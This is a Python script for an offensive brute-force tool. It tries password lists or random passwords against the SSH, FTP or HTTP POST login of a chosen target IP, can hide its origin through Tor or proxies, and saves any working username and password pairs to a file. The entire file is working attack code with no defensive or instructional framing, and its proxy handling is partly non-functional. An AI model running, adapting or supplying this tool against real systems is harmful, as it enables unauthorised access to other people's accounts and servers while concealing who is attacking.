#!/usr/bin/env python3

import argparse
import time
import requests
import socks
import socket
import random
import string
import os
import tempfile
from colorama import Fore, init

init(autoreset=True)


def current_timestamp():
    return f"{Fore.WHITE}[{Fore.YELLOW}{time.strftime('%H:%M:%S', time.localtime())}{Fore.WHITE}]{Fore.RESET}"


def generate_random_password_list(num_passwords=100000):
    characters = string.ascii_letters + string.digits + string.punctuation
    passwords = set()

    while len(passwords) < num_passwords:
        password = ''.join(random.choice(characters) for i in range(random.randint(8, 16)))
        passwords.add(password)

    with tempfile.NamedTemporaryFile(delete=False, mode='w') as tmp:
        for password in passwords:
            tmp.write(password + "\n")
        return tmp.name


def set_up_tor():
    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} INITIALIZING TOR PROXY...")

    attempt_count = 0
    max_attempts = 3
    success = False

    while attempt_count < max_attempts:
        try:
            old_ip = get_public_ip()
            socks.set_default_proxy(socks.SOCKS5, "localhost", 9050)
            socket.socket = socks.socksocket
            new_ip = get_public_ip()
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Old IP: {Fore.LIGHTBLUE_EX}{old_ip}")
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} New IP (via Tor): {Fore.LIGHTBLUE_EX}{new_ip}")
            success = True
            break
        except socket.error:
            attempt_count += 1
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Socket error occurred during Tor setup. Attempt {attempt_count}/{max_attempts}.")

    if not success:
        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Tor initialization failed after 3 attempts, proceeding without Tor.")


def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org')
        return response.text
    except requests.RequestException:
        return "Unknown IP"


def load_usernames_from_file(filename):
    try:
        with open(filename, encoding='latin-1') as file:
            return file.read().splitlines()
    except EOFError:
        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED}  EOFError encountered when reading usernames from file.")
        return []


def parse_arguments():
    parser = argparse.ArgumentParser(description='Brute force against SSH, FTP, and HTTP POST services.')
    parser.add_argument('--service', required=True, choices=['ftp', 'ssh', 'http'],
                        help="Service to attack. Choose 'ftp', 'ssh', or 'http'.")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-w', '--wordlist', help="Password Wordlist.")
    group.add_argument('-r', '--rand', action='store_true', help="Use a random password between 8 and 16 characters.")
    parser.add_argument('-u', '--users', required=True, help="File containing a list of usernames.")
    parser.add_argument('--ip', required=True, type=str, help="IP address of the target.")
    parser.add_argument('--tor', action='store_true', help="Use Tor for anonymization")
    parser.add_argument('--proxies', type=str, help="File containing a list of proxies.")
    parser.add_argument('--http-post', type=str, help="HTTP POST form parameters.")
    parser.add_argument('--success-content-length', type=int, help="Content length indicating successful login.")
    parser.add_argument('--failure-content-length', type=int, help="Content length indicating failed login.")
    parser.add_argument('--success-pattern', type=str, help="Pattern indicating a successful login.")
    parser.add_argument('--failure-pattern', type=str, help="Pattern indicating a failed login.")
    args = parser.parse_args()

    if args.wordlist and args.rand:
        parser.error("You can't use both -w and -r at the same time. Choose one.")
    elif not args.wordlist and not args.rand:
        parser.error("You must provide one of -w or -r.")

    return args


def save_to_file(ip, service, user, password):
    with open('Credentials', 'a') as file:
        file.write(f"IP: {ip}, Service: {service}, User: {user}, Password: {password}\n")


def cycle_through_proxies(proxies):
    i = 0
    while True:
        yield proxies[i]
        i = (i + 1) % len(proxies)


def ssh_attack(ip, user, password, proxy_ip=None, proxy_port=None):
    import paramiko
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    if proxy_ip and proxy_port:
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy_ip, int(proxy_port))
        socket.socket = socks.socksocket
    try:
        client.connect(ip, username=user, password=password, timeout=5)
        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Success for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}")
        return True
    except paramiko.AuthenticationException:
        return False
    except (socket.timeout, paramiko.SSHException):
        if proxy_ip and proxy_port:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Proxy {proxy_ip}:{proxy_port} failed.")
        else:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} SSH Connection failed.")

        return None
    except socket.error as e:
        if 'Connection reset by peer' in str(e):
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Connection reset by peer.")
        else:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Error with SSH (socket.error): {e}")
        return None
    except paramiko.ssh_exception.SSHException as e:
        if 'Error reading SSH protocol banner' in str(e):
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Error reading SSH protocol banner.")
        else:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Error with SSH: {e}")
        return False
    finally:
        client.close()


def ftp_attack(ip, user, password, proxy_ip=None, proxy_port=None):
    from ftplib import FTP, error_perm
    if proxy_ip and proxy_port:
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy_ip, int(proxy_port))
        socket.socket = socks.socksocket
    try:
        with FTP(ip, timeout=5) as ftp:
            ftp.login(user, password)
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Success for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}")
            return True
    except error_perm as e:
        if str(e).startswith('530 '):
            return False
        else:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} FTP error: {e}")
            return False
    except socket.error:
        if proxy_ip and proxy_port:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Proxy {proxy_ip}:{proxy_port} failed.")
        else:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} FTP Connection failed.")

        return None


def http_attack(ip, user, password, http_post_params, success_pattern, failure_pattern, success_content_length=None, failure_content_length=None, proxy_ip=None, proxy_port=None):
    if proxy_ip and proxy_port:
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy_ip, int(proxy_port))
        socket.socket = socks.socksocket
    
    try:
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        data = http_post_params.replace('^USER^', user).replace('^PASS^', password)
        response = requests.post(f"http://{ip}", data=data, headers=headers, timeout=5)
        
        if success_content_length and len(response.content) == success_content_length:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Success for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}")
            return True
        elif failure_content_length and len(response.content) == failure_content_length:
            return False
        elif success_pattern and success_pattern in response.text:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Success for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}")
            return True
        elif failure_pattern and failure_pattern in response.text:
            return False
        else:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Unidentified response for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.YELLOW}{password}")
            return None
    except requests.RequestException as e:
        if proxy_ip and proxy_port:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Proxy {proxy_ip}:{proxy_port} failed.")
        else:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} HTTP attack failed: {e}")
        return None


def main():
    args = parse_arguments()

    if args.tor:
        set_up_tor()

    proxies = []
    if args.proxies:
        with open(args.proxies) as proxy_file:
            proxies = [line.strip() for line in proxy_file]

    if args.rand:
        password_file = generate_random_password_list()
    else:
        password_file = args.wordlist

    usernames = load_usernames_from_file(args.users)

    if args.service == 'ssh':
        for user in usernames:
            for password in open(password_file).read().splitlines():
                if ssh_attack(args.ip, user, password, proxy_ip=None, proxy_port=None):
                    save_to_file(args.ip, 'ssh', user, password)
                    break

    elif args.service == 'ftp':
        for user in usernames:
            for password in open(password_file).read().splitlines():
                if ftp_attack(args.ip, user, password, proxy_ip=None, proxy_port=None):
                    save_to_file(args.ip, 'ftp', user, password)
                    break

    elif args.service == 'http':
        if not args.http_post:
            print(f"{Fore.WHITE}[{Fore.YELLOW}ERROR{Fore.WHITE}]{Fore.RESET}{Fore.RED} HTTP POST parameters must be specified for HTTP attack.")
            return

        for user in usernames:
            for password in open(password_file).read().splitlines():
                if http_attack(
                    args.ip, user, password,
                    http_post_params=args.http_post,
                    success_pattern=args.success_pattern,
                    failure_pattern=args.failure_pattern,
                    success_content_length=args.success_content_length,
                    failure_content_length=args.failure_content_length,
                    proxy_ip=None, proxy_port=None
                ):
                    save_to_file(args.ip, 'http', user, password)
                    break

if __name__ == "__main__":
    main()

